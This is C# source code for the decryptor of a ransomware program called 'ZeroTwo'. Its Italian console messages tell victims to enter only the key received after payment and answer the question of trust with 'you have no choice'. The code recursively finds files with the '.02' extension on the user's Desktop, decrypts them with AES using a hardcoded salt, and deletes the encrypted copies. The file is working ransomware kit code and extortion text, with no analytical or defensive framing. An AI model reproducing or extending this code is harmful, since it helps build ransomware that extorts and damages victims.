using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ZeroTwo.src {
    class Reverter {
        private const string EXT = ".02";

        private const string UTIL_WELCOME = 
            "La presente utility ti permette di recuperare i file cifrati dal cryptolocker ZeroTwo.\n\n" +
            "ATTENZIONE - non modifcare i file cifrati e utilizza SOLO la chiave ricevuta a seguito del pagamento!\n\n" + 
            "PER QUALE MOTIVO? - Utilizzando una chiave diversa verrà effettuata una decifratura che non restituirà i file originali che saranno irrimediabilmente irrecuperabili.\n" + 
            "Modificando i file, allo stesso modo, la decifratura restituirà dei file corrotti pur utilizzando la chiave corretta.\n\n" + 
            "COME POSSO FIDARMI? - Non hai scelta. \n\n" + 
            "Chiave di decifratura: ";

        private static byte[] k = null;
        private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");

        public static void Main(string[] args) {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(UTIL_WELCOME);
            string inputKey = Console.ReadLine();
            Console.WriteLine("\nHai inserito: " + inputKey + "\nPremi INVIO per confermare, oppure un tasto qualsiasi per annullare e uscire.");
            ConsoleKeyInfo confirmInfo = Console.ReadKey();
            if(confirmInfo.Key == ConsoleKey.Enter) {
                k = Encoding.ASCII.GetBytes(inputKey);
                Console.WriteLine("\nDecifratura in corso...");
                Exec();
                Console.WriteLine("\nDecifratura completata, puoi uscire premendo un tasto qualsiasi e puoi eliminare questa utility!");
                Console.ReadKey();
            }
        }

        private static void Exec() {
            string mainPath = "C:/users/" + Environment.UserName + "/Desktop";
            string[] files = Directory.GetFiles(mainPath, "*.*", SearchOption.AllDirectories);
            foreach (string file in files) {
                if (Path.GetExtension(file).Equals(EXT)) {
                    Dec(file, file.Remove(file.Length - EXT.Length), k);
                }
            }
        }

        private static void Dec(string inputFile, string outputFile, byte[] passwordBytes) {
            byte[] saltBytes = s;

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;
            AES.Mode = CipherMode.CBC;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fs = new FileStream(outputFile, FileMode.Create);

            int data;
            while ((data = cs.ReadByte()) != -1)
                fs.WriteByte((byte)data);

            fs.Close();
            cs.Close();
            fsCrypt.Close();

            File.Delete(inputFile);
        }
    }
}
